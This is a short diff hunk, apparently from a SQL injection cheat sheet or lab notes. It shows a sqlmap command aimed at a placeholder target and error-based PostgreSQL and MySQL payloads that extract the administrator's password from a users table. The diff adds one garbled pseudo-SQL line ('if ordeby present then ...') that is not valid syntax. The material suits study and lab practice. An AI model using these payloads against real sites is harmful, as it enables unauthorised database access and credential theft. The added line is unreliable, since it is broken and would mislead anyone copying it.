@@ -403,7 +403,7 @@ sqlmap -u "https://TARGET/path" --cookie="TrackingId=BASE*" -D public -T users -
 ```sql
 -- PostgreSQL
 ' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
-
+if ordeby present then (CAST((SELECT password FROM users WHERE username='administrator') AS int))
 -- MySQL
 ' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users WHERE username='administrator')))--
 
